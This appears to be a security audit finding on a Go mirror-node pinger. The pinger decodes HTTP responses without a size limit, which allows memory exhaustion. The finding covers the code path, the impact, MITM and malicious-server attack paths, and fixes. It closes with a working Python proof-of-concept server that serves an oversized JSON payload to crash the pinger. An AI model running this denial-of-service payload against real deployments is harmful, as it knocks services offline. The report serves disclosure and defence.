### Title
Unbounded HTTP Response Body in `fetchMirrorNodeNetwork` Enables Memory Exhaustion via Malicious Mirror Node

### Summary
`fetchMirrorNodeNetwork()` in `pinger/mirror_node_client.go` decodes the mirror node HTTP response body with no size cap and no limit on the number of nodes or service endpoints. An attacker who can control the mirror node response — via MITM on the plain-HTTP default transport or a compromised mirror node — can deliver a crafted JSON payload with millions of `serviceEndpoint` entries, exhausting the pinger's memory and crashing the process.

### Finding Description
**Exact code path:**

`pinger/mirror_node_client.go`, `fetchMirrorNodeNetwork()`, lines 84–124.

```go
// line 84-88: raw body, no LimitReader
resp, err := httpClient.Do(req)
...
defer resp.Body.Close()

// line 95-98: unbounded decode
var payload nodesEnvelope
if err := json.NewDecoder(resp.Body).Decode(&payload); err != nil { ... }

// line 100-124: unbounded iteration
network := make(map[string]hiero.AccountID)
for _, n := range payload.Nodes {                    // no cap on len(payload.Nodes)
    ...
    for _, ep := range n.ServiceEndpoints {          // no cap on len(n.ServiceEndpoints)
        ...
        network[addr] = nodeAccountId               // unbounded map growth
    }
}
```

**Root cause:** `json.NewDecoder(resp.Body)` reads directly from the raw response body with no `io.LimitReader`. The `nodesEnvelope` struct accepts an arbitrary-length `Nodes` slice, and each `nodeEntry` accepts an arbitrary-length `ServiceEndpoints` slice. There is no guard on `len(payload.Nodes)`, `len(n.ServiceEndpoints)`, or the total size of the `network` map.

**Why the only existing check is insufficient:** The sole defense is the `http.Client{Timeout: cfg.mirrorNodeClientTimeout}` (default 10 s, line 46). A local or fast-network server can stream gigabytes of JSON well within 10 seconds, so the timeout does not bound memory consumption.

**Exploit flow:**
1. Attacker controls the mirror node response (see Likelihood section).
2. Attacker crafts a JSON body with, e.g., 10 000 `nodes` entries each containing 10 000 `serviceEndpoints` with unique `ip_address_v4`/`port` pairs → 10⁸ map insertions.
3. `json.Decoder` allocates the full slice in memory during decode.
4. The inner loop inserts every unique `addr` into `network`, growing the map without bound.
5. The pinger process is OOM-killed (Kubernetes hard limit: **20 MiB**, `charts/hedera-mirror-pinger/values.yaml` line 73).

### Impact Explanation
The pinger process is killed by the OOM reaper. Kubernetes restarts it, but each restart triggers another `buildNetworkFromMirrorNodes` call, which hits the same malicious endpoint again — creating a crash loop. The pinger stops submitting heartbeat transfers, breaking liveness/readiness probes and taking the component offline for as long as the attacker controls the mirror node response. The 20 MiB memory limit means even a modest payload (a few hundred thousand entries) is sufficient to trigger the kill.

### Likelihood Explanation
Two realistic paths exist for an attacker to control the mirror node response:

1. **Plain-HTTP MITM (most accessible):** The default Helm chart configures `HIERO_MIRROR_PINGER_REST: "http://{{ .Release.Name }}-restjava:80"` — plain HTTP, no TLS (`charts/hedera-mirror-pinger/values.yaml` line 19). Any attacker with network access inside the Kubernetes cluster (e.g., a compromised sidecar, a rogue pod in the same namespace, or ARP/DNS spoofing on a flat network) can intercept and replace the response. No cluster-admin privileges are required — only network reachability to the pinger pod.

2. **Compromised or malicious mirror node:** If the operator points the pinger at an external or third-party mirror node over HTTP, the mirror node operator can serve the malicious payload directly.

Both paths are repeatable: the attacker can sustain the crash loop indefinitely.

### Recommendation
Apply two independent defences:

1. **Wrap the response body with `io.LimitReader`** before passing it to the JSON decoder, e.g.:
   ```go
   const maxBodyBytes = 1 << 20 // 1 MiB
   if err := json.NewDecoder(io.LimitReader(resp.Body, maxBodyBytes)).Decode(&payload); err != nil { ... }
   ```

2. **Cap node and endpoint counts** after decoding:
   ```go
   const maxNodes = 200
   const maxEndpointsPerNode = 20
   if len(payload.Nodes) > maxNodes { return nil, false, fmt.Errorf("too many nodes: %d", len(payload.Nodes)) }
   // and inside the loop:
   if len(n.ServiceEndpoints) > maxEndpointsPerNode { continue }
   ```

3. **Use HTTPS** for the mirror REST endpoint to eliminate the MITM vector (change the default Helm value from `http://` to `https://` and enforce TLS verification).

### Proof of Concept
```python
# Minimal malicious mirror node (Python)
from http.server import BaseHTTPRequestHandler, HTTPServer
import json, itertools

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        # 50 000 nodes × 50 000 endpoints = 2.5 billion map entries attempted
        nodes = []
        for i in range(50_000):
            eps = [{"ip_address_v4": f"10.{(i>>16)&255}.{(i>>8)&255}.{i&255}",
                    "port": j+1} for j in range(50_000)]
            nodes.append({"node_account_id": f"0.0.{i+3}", "service_endpoints": eps})
        body = json.dumps({"nodes": nodes, "links": {"next": None}}).encode()
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.end_headers()
        self.wfile.write(body)

HTTPServer(("0.0.0.0", 5551), Handler).serve_forever()
```

Steps:
1. Run the server above (or a streaming variant that writes JSON incrementally to stay within the 10 s timeout).
2. Configure the pinger with `HIERO_MIRROR_PINGER_NETWORK=other` and `HIERO_MIRROR_PINGER_REST=http://<attacker-ip>:5551`.
3. Start the pinger. `buildNetworkFromMirrorNodes` calls `fetchMirrorNodeNetwork`, which decodes the payload and iterates the unbounded loops.
4. Observe OOM kill within seconds; the process enters a crash loop.
